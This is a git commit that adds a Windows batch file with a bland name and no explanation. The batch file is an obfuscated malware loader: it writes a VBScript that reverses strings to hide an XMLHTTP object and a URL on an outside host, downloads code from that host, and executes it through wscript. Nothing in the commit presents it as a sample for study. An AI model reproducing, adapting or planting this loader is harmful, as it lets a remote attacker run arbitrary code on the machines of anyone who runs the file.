dda33675f38e193ed23f1970d7fac15f06212371
doc-forum-data <45460630+doc-forum-data@users.noreply.github.com>
2018-12-03 20:25:19 -0200

    Add files via upload

---
+++ l-o-o-0312202459.cmd
@@ -0,0 +1,27 @@
+@echo off
+setlocal EnableExtensions DisableDelayedExpansion
+if exist %public%\aGWZhlm goto h4774OZ
+md "%PUBLIC%\aGWZhlm" && cls
+set jBzKzcW=%USERNAME%.vbs
+set iLG2oCm="%PUBLIC%\aGWZhlm\%jBzKzcW%" ECHO
+:Fase1
+>>%iLG2oCm% Dim bC2Q9SA
+>>%iLG2oCm% Dim cbjvRyZ
+>>%iLG2oCm% Dim d1QVasl
+>>%iLG2oCm% Dim e5cfGy3
+>>%iLG2oCm% Dim fgaT5Cl
+>>%iLG2oCm% Dim gH0MWH3
+>>%iLG2oCm% Dim hKxjupy
+>>%iLG2oCm% cbjvRyZ = WScript.Arguments(0)
+>>%iLG2oCm% d1QVasl = WScript.Arguments(1)
+>>%iLG2oCm% Set bC2Q9SA = CreateObject(StrReverse("PTTHLMX.2LMXSM"))
+>>%iLG2oCm% bC2Q9SA.open StrReverse(cbjvRyZ), StrReverse(d1QVasl), False
+>>%iLG2oCm% execute("bC2Q9SA.setRequestHeader ""User-Agent"", ""0M7yC5u2stom2U4se5r"":bC2Q9SA.setRequestHeader ""content-type"", ""application/x-www-form-urlencoded""")
+>>%iLG2oCm% execute("bC2Q9SA.send :e5cfGy3 = bC2Q9SA.responseText")
+>>%iLG2oCm% execute( e5cfGy3 )
+cls
+@echo off
+ping 127.0.0.1 -n 1 > nul
+start wscript //Nologo "%PUBLIC%\aGWZhlm\%jBzKzcW%" AS111 "/lm.virporpretsamttd//:ptth" && @echo off
+endlocal
+:h4774OZ
